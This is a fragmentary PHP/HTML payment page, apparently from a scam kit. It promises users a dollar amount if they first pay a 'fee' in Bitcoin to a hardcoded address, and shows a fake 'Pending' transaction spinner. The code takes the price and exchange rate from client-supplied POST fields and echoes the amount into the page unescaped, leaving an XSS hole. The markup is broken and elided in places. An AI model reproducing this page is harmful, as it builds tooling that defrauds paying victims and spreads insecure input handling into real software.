...
<?php  
  ...
  $rate = $_POST["rate"];   //$data[1] is outdated now, they have updated their json order. This new number 2 now fetches USD price. 
  $usd_price = $_POST["usd"];
  $bitcoin_price = round( $usd_price / $rate , 8 );
  if (empty($usd_price)) {
	  ?>
<script src="https://unpkg.com/sweetalert@2.1.2/dist/sweetalert.min.js"></script> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/0.5.0/sweet-alert.css"> <script src='https://www.google.com/recaptcha/api.js'></script>
</html>
<body>
...
$sql = "UPDATE tools SET tools = tools+245 WHERE id ='1'";
						...
						<div class="col-md-12">
                                <div class="block">
                                    <div class="block-header block-header-default">
                                        <h3 class="block-title">PerfectMoney Payment</h3>
                                        
                                    </div>
                                    <div class="block-content">
                                        <center>
                                            <?php $new_price = (112.2 * $usd_price) / 100; ?>
<p>You will get <b><font color="red"><?=$usd_price ?>$</b></font> & You are going to pay the fee, Click the button <b><font color="red">"PAY NOW !"</b></font> to proceed!</p>
<h4>
<center>
<form action="https://pmbtc.io/btc/payment.php?direct" name="fcaptcha" method="post" target="_blank">
                            ...
                            <input type="hidden" value="<?=$bitcoin_price ?>" name="PAYMENT_AMOUNT_BTC"><br><br>
                            <input type="hidden" value="1Jbji3UY6WJdtSfkPadw774ptVSVmY3rWz" name="BTC_ADDR">
                            <input type="hidden" value="" name="curs" id="rate1">
                             <br><br>
                            </font>
                        
						</center></form>
<center>&nbsp;</center>
<center><font color="black"><b>Transaction Status : <font color="red" size="4">Pending... </font></b></font>
</center>
</center>
<center><img width="45" src="progress.gif"><br><h8><font color="black">Please dont <b>Refresh</b>, press <b>Back</b> or <b>Close</b> this page <br>until your Payment Completed!</font></h8></center>
                                    </div>
                                </div>
                        </div>
                        <!-- END Row #3 -->
